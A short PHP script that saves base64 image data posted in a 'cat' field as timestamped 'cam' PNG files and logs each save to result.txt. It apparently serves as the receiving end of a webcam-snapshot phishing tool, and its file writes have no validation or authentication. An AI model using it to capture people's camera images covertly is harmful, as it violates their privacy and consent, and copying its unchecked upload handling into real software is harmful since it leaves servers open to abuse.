<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];


$unencodedData=base64_decode($imageData);
$data = 'cam'.$date.'.png';
$fp = fopen( '../../images/'.$data, 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

// Append image save info to result.txt (detailed log will be added by JavaScript)
file_put_contents("result.txt", "Image File Was Saved ! > /images/".$data."\n", FILE_APPEND);
exit();
?>

